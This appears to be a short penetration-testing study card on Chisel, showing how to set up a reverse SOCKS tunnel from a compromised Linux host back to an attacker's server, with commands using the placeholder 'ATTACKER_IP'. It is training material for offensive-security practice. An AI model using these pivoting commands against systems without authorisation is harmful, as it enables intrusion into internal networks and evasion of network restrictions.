Tool Overview

What is Chisel?

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It's an excellent tool for creating SOCKS proxies and port forwards, particularly useful when SSH is not available on the compromised host.

  • Mechanism: Client-server architecture over HTTP.
  • Flexibility: Supports both SOCKS proxies and port forwards.
Usage Pattern

Server and Client Setup

You run a chisel server on your attacking machine and a chisel client on the compromised host, which connects back to your server to establish the tunnel.

# Example: Chisel Server on Attacker (Kali) chisel server --reverse -p 8000 # Example: Chisel Client on Compromised Host (Linux) chisel client ATTACKER_IP:8000 R:socks # This creates a reverse SOCKS proxy on the attacker's machine
Practical Scenario

Bypassing SSH Restrictions

If SSH is blocked or not installed on a compromised Linux host, chisel can still establish a reverse SOCKS proxy or port forward by tunneling over HTTP, allowing you to access internal resources.

Key Takeaway

Chisel is a powerful and flexible tunneling tool that can establish SOCKS proxies and port forwards over HTTP, making it ideal for pivoting in environments where SSH is restricted or unavailable.

Common Mistake

Incorrectly setting up the server and client commands, especially the reverse flag (-R) or the port forwarding syntax (R:socks or R:localport:remoteip:remoteport).
